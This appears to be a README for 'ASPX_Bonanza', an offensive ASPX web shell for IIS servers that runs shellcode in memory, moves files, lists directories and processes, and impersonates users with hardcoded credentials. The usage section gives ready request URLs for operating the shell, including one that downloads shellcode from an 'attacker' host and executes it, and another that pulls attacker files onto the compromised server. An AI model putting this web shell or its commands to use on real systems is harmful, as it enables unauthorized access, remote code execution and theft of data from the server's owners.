# ASPX_Bonanza

ASPX_Bonanza is a multi-featured aspx shell with a unique use case. It has a few features with capabilities such as the use of executing shellcode in memory. Also, this script logs in directly with the impersonating user credentials and doesn’t require the seImpersonate privilege for the user running IIS.

`impersonate_bonanza.aspx` requires valid credentials to get the token and impersonate the user.
`bonanza.aspx` does not require credentials and will run as the current user without impersonating.

----

## Features
- Execute shellcode in memory
- Download and Upload files
- List directories
- Cat files
- List processes

## Demo
https://user-images.githubusercontent.com/87979263/165757358-2b1e54e2-8442-4302-888a-ee2dd65c9eac.mp4

## Usage
### Impersonating user
In order to impersonate the user you want, in the source code you will have to edit the `username`, `domain` & `password`.

### Download and Execute shellcode in memory
``
https://url/impersonate_bonanza.aspx?shellcodeUrl=https://attacker/shellcode.bin
``
### List directories
``
https://url/impersonate_bonanza.aspx?dir=C:\users\public
``

### Download files
``
https://url/impersonate_bonanza.aspx?FileDownload=C:\users\public\FILE
``

### Upload files
``
https://url/impersonate_bonanza.aspx?UploadSource=https://attacker/FILE&UploadDestination=C:\users\public\FILE
``

### Cat files
``
https://url/impersonate_bonanza.aspx?Cat=C:\users\public\FILE
``

### View processes
``
https://url/impersonate_bonanza.aspx?Process=1
``
